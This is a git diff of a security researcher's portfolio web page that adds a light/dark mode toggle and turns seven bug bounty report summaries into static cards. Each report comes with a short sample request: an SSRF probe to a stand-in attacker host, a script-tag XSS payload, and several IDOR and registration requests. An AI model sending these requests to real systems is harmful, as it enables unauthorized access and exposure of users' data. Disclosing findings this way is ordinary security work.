@@ -8,9 +8,12 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
   <style>
-    :root{--bg:#0b0f12;--card:#0f1620;--muted:#98a0aa;--accent:#ef4444;--glass:rgba(255,255,255,0.03)}
+    :root{
+      --bg:#0b0f12;--card:#0f1620;--muted:#98a0aa;--accent:#ef4444;--text:#e6eef6;
+      --light-bg:#f9f9f9;--light-card:#fff;--light-text:#0b0f12
+    }
     *{box-sizing:border-box;margin:0;padding:0}
-    body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial;color:#e6eef6;background:var(--bg);overflow-x:hidden;display:flex}
+    body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial;color:var(--text);background:var(--bg);overflow-x:hidden;display:flex}
 
     /* sidebar */
     #sidebar{width:260px;min-height:100vh;background:#0f1620;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-shadow:4px 0 20px rgba(0,0,0,0.6);position:fixed;left:0;top:0;bottom:0}
@@ -22,8 +25,8 @@
     #sidebar ul li{margin:10px 0}
     #sidebar ul li a{color:#e6eef6;text-decoration:none;display:flex;align-items:center;gap:10px;padding:10px;border-radius:8px;transition:background 0.3s}
     #sidebar ul li a:hover{background:rgba(239,68,68,0.1);color:var(--accent)}
-    #rights{font-size:11px;color:var(--muted);margin-top:20px;opacity:0.8;transition:color 0.3s ease, opacity 0.3s ease}
-    #rights:hover{color:var(--accent);opacity:1}
+    #toggleMode{margin-top:auto;margin-bottom:20px;cursor:pointer;width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.05);transition:background 0.3s}
+    #toggleMode:hover{background:rgba(239,68,68,0.15)}
 
     /* main content */
     #content{margin-left:260px;flex:1;padding:30px;max-width:calc(100% - 260px)}
@@ -38,7 +41,11 @@
     section h2{margin-bottom:8px}
     pre.code{background:#020617;padding:12px;border-radius:8px;color:#cfe9ff;font-family:ui-monospace,Menlo,Monaco,monospace;font-size:13px;overflow:auto;border:1px solid rgba(255,255,255,0.03)}
 
-    footer{text-align:center;color:var(--muted);font-size:13px;padding:30px;margin-top:40px}
+    footer{text-align:center;color:var(--muted);font-size:12px;padding:20px;margin-top:40px}
+    footer:hover{color:var(--accent)}
+
+    /* light mode */
+    html[mode="light"]{--bg:var(--light-bg);--card:var(--light-card);--text:var(--light-text);--muted:#444}
   </style>
 </head>
 <body>
@@ -52,7 +59,7 @@
       <li><a href="#about"><i class="fa fa-user"></i> About</a></li>
       <li><a href="#contact"><i class="fa fa-envelope"></i> Contact</a></li>
     </ul>
-    <div id="rights">© 2025 codenamevenom — All rights reserved</div>
+    <div id="toggleMode"><i id="modeIcon" class="fa fa-moon"></i></div>
   </aside>
 
   <main id="content">
@@ -62,15 +69,63 @@
     </header>
 
     <section id="reports">
-      <div class="grid" id="reportGrid">
-        <!-- cards dynamically inserted here -->
+      <div class="grid">
+        <div class="card" data-aos="fade-up">
+          <h3>SSRF — /api/og/statistic (GET image)</h3>
+          <div class="impact">Paid</div>
+          <p class="summary">GET parameter "image" allowed internal network discovery via SSRF.</p>
+          <a class="btn" href="#r1">Read more</a>
+        </div>
+        <div class="card" data-aos="fade-up">
+          <h3>IDOR — /api/Log?actionTag=parrainage-btn-envoyer</h3>
+          <div class="impact">Paid</div>
+          <p class="summary">POST parameter <code>idAdhesion</code> exposed unauthorized resources.</p>
+          <a class="btn" href="#r2">Read more</a>
+        </div>
+        <div class="card" data-aos="fade-up">
+          <h3>Business Logic — Weak Email Validation</h3>
+          <div class="impact">Paid</div>
+          <p class="summary">Weak validation + no anti-automation led to abuse of workflows.</p>
+          <a class="btn" href="#r3">Read more</a>
+        </div>
+        <div class="card" data-aos="fade-up">
+          <h3>Improper Access Control — /api/auth/local/register</h3>
+          <div class="impact">Paid</div>
+          <p class="summary">POST allowed unauthorized user registration under certain conditions.</p>
+          <a class="btn" href="#r4">Read more</a>
+        </div>
+        <div class="card" data-aos="fade-up">
+          <h3>DOM XSS — /user/auth/chooseschema (tabId)</h3>
+          <div class="impact">Paid</div>
+          <p class="summary">Reflected tabId parameter led to DOM XSS in UI flow.</p>
+          <a class="btn" href="#r5">Read more</a>
+        </div>
+        <div class="card" data-aos="fade-up">
+          <h3>IDOR — /api/quotes/[UUID]/</h3>
+          <div class="impact">Paid</div>
+          <p class="summary">Predictable UUID allowed PII exposure of other users.</p>
+          <a class="btn" href="#r6">Read more</a>
+        </div>
+        <div class="card" data-aos="fade-up">
+          <h3>IDOR — /v2/apps/[ID]/users/{user_id}/verification-methods</h3>
+          <div class="impact">Paid</div>
+          <p class="summary">Endpoint leaked verification methods of other users.</p>
+          <a class="btn" href="#r7">Read more</a>
+        </div>
       </div>
     </section>
 
-    <div id="reportDetails"></div>
+    <section id="r1"><h2>Report 1 — SSRF via /api/og/statistic</h2><pre class="code">GET /api/og/statistic?image=https://attacker/probe</pre></section>
+    <section id="r2"><h2>Report 2 — IDOR via /api/Log</h2><pre class="code">POST /api/Log?actionTag=parrainage-btn-envoyer {"idAdhesion":"123"}</pre></section>
+    <section id="r3"><h2>Report 3 — Weak Email Validation</h2><p>Email validation was bypassable and anti-automation controls were missing.</p></section>
+    <section id="r4"><h2>Report 4 — Improper Access Control</h2><pre class="code">POST /api/auth/local/register {"email":"attacker@example.com","password":"pass"}</pre></section>
+    <section id="r5"><h2>Report 5 — DOM XSS</h2><pre class="code">GET /user/auth/chooseschema?tabId=<script>alert(1)</script></pre></section>
+    <section id="r6"><h2>Report 6 — IDOR /api/quotes/[UUID]/</h2><pre class="code">GET /api/quotes/UUID</pre></section>
+    <section id="r7"><h2>Report 7 — IDOR Verification Methods</h2><pre class="code">GET /v2/apps/1/users/2/verification-methods</pre></section>
 
     <footer>
-      <div>codenamevenom — Portfolio for Application Security, Red Team, Security Engineering</div>
+      <div>© 2025 codenamevenom — All rights reserved</div>
+      <div>Portfolio for Application Security, Red Team, Security Engineering</div>
     </footer>
   </main>
 
@@ -78,33 +133,33 @@
   <script>
     AOS.init({duration:700, once:true});
 
-    // JSON template for reports
-    const reports = [
-      {id:"r1", title:"SSRF — /api/og/statistic (GET image)", impact:"Paid", summary:"GET parameter \"image\" allowed internal network discovery via SSRF.", details:"<pre class='code'>GET /api/og/statistic?image=https://attacker/probe</pre>"},
-      {id:"r2", title:"IDOR — /api/Log?actionTag=parrainage-btn-envoyer", impact:"Paid", summary:"POST parameter idAdhesion exposed unauthorized resources.", details:"<pre class='code'>POST /api/Log?actionTag=parrainage-btn-envoyer {\"idAdhesion\":\"123\"}</pre>"},
-      {id:"r3", title:"Business Logic — Weak Email Validation", impact:"Paid", summary:"Weak validation + no anti-automation led to abuse of workflows.", details:"<p>Email validation was bypassable and anti-automation controls were missing.</p>"},
-      {id:"r4", title:"Improper Access Control — /api/auth/local/register", impact:"Paid", summary:"POST allowed unauthorized user registration under certain conditions.", details:"<pre class='code'>POST /api/auth/local/register {\"email\":\"attacker@example.com\",\"password\":\"pass\"}</pre>"},
-      {id:"r5", title:"DOM XSS — /user/auth/chooseschema (tabId)", impact:"Paid", summary:"Reflected tabId parameter led to DOM XSS in UI flow.", details:"<pre class='code'>GET /user/auth/chooseschema?tabId=<script>alert(1)</script></pre>"},
-      {id:"r6", title:"IDOR — /api/quotes/[UUID]/", impact:"Paid", summary:"Predictable UUID allowed PII exposure of other users.", details:"<pre class='code'>GET /api/quotes/UUID</pre>"},
-      {id:"r7", title:"IDOR — /v2/apps/[ID]/users/{user_id}/verification-methods", impact:"Paid", summary:"Endpoint leaked verification methods of other users.", details:"<pre class='code'>GET /v2/apps/1/users/2/verification-methods</pre>"}
-    ];
+    // Dark / light mode toggle
+    (function(){
+      const MODE_KEY = 'mode';
+      const html = document.documentElement;
+      const btn = document.getElementById('toggleMode');
+      const icon = document.getElementById('modeIcon');
 
-    // populate cards
-    const grid = document.getElementById("reportGrid");
-    const details = document.getElementById("reportDetails");
-    reports.forEach(r => {
-      const card = document.createElement("div");
-      card.className = "card";
-      card.setAttribute("data-aos","fade-up");
-      card.innerHTML = `<h3>${r.title}</h3><div class='impact'>${r.impact}</div><p class='summary'>${r.summary}</p><a class='btn' href='#${r.id}'>Read more</a>`;
-      grid.appendChild(card);
+      function setMode(mode){
+        if(mode==='light'){
+          html.setAttribute('mode','light');
+          icon.className='fa fa-sun';
+        } else {
+          html.removeAttribute('mode');
+          icon.className='fa fa-moon';
+        }
+        sessionStorage.setItem(MODE_KEY,mode);
+      }
 
-      const section = document.createElement("section");
-      section.id = r.id;
-      section.setAttribute("data-aos","fade-up");
-      section.innerHTML = `<h2>${r.title}</h2>${r.details}`;
-      details.appendChild(section);
-    });
+      const stored = sessionStorage.getItem(MODE_KEY);
+      if(stored==='light'){ setMode('light'); }
+
+      btn.addEventListener('click',()=>{
+        const cur = sessionStorage.getItem(MODE_KEY);
+        if(cur==='light'){ setMode('dark'); }
+        else { setMode('light'); }
+      });
+    })();
   </script>
 </body>
 </html>
